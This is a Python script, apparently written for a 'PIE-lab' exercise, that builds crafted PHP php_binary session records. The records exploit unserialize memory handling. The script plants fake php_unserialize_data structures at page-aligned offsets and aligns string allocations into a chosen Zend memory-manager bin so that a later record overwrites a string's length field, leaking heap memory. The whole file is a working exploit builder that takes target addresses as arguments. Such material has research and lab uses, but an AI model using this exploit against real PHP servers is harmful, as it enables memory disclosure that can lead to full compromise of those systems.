#!/usr/bin/env python3
"""PIE-lab leak record builder v3 (php_binary handler).

Record order:  S(string SLEN) | J(i:4096) | K(filler+fake structs) | TAIL
TAIL is one of:
  arr  -> a0 = a:1:{i:0;i:1;}        (56 byte HashTable, bin 56)
  obj  -> o0 = O:8:"stdClass":0:{}   (zend_object, bin 56/64)
  str  -> z0 = s:NN:"ZZ.."           (small string)

S value length is chosen so that the S zend_string allocation lands in the
same Zend MM bin as the tail structure (HashTable 56 -> bin 56; string
struct size 24+len+1 must be 49..56 -> len 24..31).

File byte i maps to address val+i, val = X1+0x18, X1 page aligned.  The fake
php_unserialize_data is replicated at every page-aligned address of the read
buffer; the fake var_dtor_entries used_slots is written at B0.

Slot arithmetic (dtor slots, one per php_binary record):
    rec1 S -> B0+0x10+16*U0
    rec2 J -> +0x10
    rec3 K -> +0x20
    rec4 T -> +0x30
U0 = (S_addr - B0 - 0x10)/16 makes rec1 land on the S zend_string header and
rec2 (i:4096) overwrite S->len.  S_addr must be 16 byte aligned.
"""
import struct
import sys

PAGE = 0x1000


def rec(name, val):
    nb = name.encode()
    assert 1 <= len(nb) <= 127, name
    return bytes([len(nb)]) + nb + val


def tail_bytes(kind, slen):
    if kind == 'arr':
        return rec('a0', b'a:1:{i:0;i:1;}')
    if kind == 'obj':
        return rec('o0', b'O:8:"stdClass":0:{}')
    if kind == 'str':
        return rec('z0', b's:%d:"' % slen + b'Z' * slen + b'";')
    raise SystemExit('bad tail ' + kind)


def build(total, val, P, B0, U0, slen, kind):
    head = rec('S', b's:%d:"' % slen + b'Q' * slen + b'";') + rec('J', b'i:4096;')
    tail = tail_bytes(kind, slen)
    L = total - len(head) - len(rec('K', b's:')) - len(tail) - 2 - 1
    for _ in range(16):
        h = rec('K', b's:%d:"' % L)
        nl = total - len(head) - len(h) - len(tail) - 2
        if nl == L:
            break
        L = nl
    h = rec('K', b's:%d:"' % L)
    payload_start = len(head) + len(h)
    payload = bytearray(b'A' * L)
    reps = 0
    for m in range(1, total // PAGE + 2):
        off = m * PAGE - 0x18            # page-aligned address X1 + m*PAGE
        b = off - payload_start
        if b < 0 or b + 0x48 > L:
            continue
        struct.pack_into('<QQQQQQQQ', payload, b,
                         P + 56, B0, B0, 0, 0, 0, 0x7fffffff, 1018)
        struct.pack_into('<Q', payload, b + 64, 0)
        reps += 1
    boff = (B0 - val) - payload_start
    assert 0 <= boff and boff + 16 <= L, (hex(B0), boff, L)
    struct.pack_into('<qQ', payload, boff, U0, 0)
    data = head + h + bytes(payload) + b'";' + tail
    assert len(data) == total, (len(data), total)
    return data, dict(total=total, val=hex(val), P=hex(P), B0=hex(B0), U0=U0,
                      reps=reps, payload_start=payload_start, L=L,
                      b_off=boff, head=len(head), khdr=len(h), slen=slen,
                      tail=kind)


def main():
    out = sys.argv[1]
    total = int(sys.argv[2], 0)
    val = int(sys.argv[3], 0)
    P = int(sys.argv[4], 0)
    B0 = int(sys.argv[5], 0)
    U0 = int(sys.argv[6], 0)
    slen = int(sys.argv[7], 0)
    kind = sys.argv[8] if len(sys.argv) > 8 else 'arr'
    data, meta = build(total, val, P, B0, U0, slen, kind)
    with open(out, 'wb') as fp:
        fp.write(data)
    print('wrote %s %d' % (out, len(data)))
    for k, v in meta.items():
        print('  %s=%s' % (k, v))


if __name__ == '__main__':
    main()
